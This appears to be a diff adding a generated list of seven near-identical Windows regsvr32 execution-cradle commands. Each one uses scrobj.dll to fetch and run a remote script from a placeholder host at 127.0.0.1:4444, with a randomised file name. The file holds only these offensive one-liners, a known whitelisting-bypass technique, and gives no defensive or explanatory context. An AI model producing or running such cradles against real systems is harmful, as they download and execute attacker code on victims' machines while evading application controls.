@@ -1,0 +1,21 @@
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_nznvtz.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_ynuutw.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_gtiyif.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_hijbfy.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_gzcgmk.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_auhibu.ps1 scrobj.dll
+
+regsvr32:
+regsvr32 /s /n /u /i:127.0.0.1:4444:WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_knztre.ps1 scrobj.dll
+
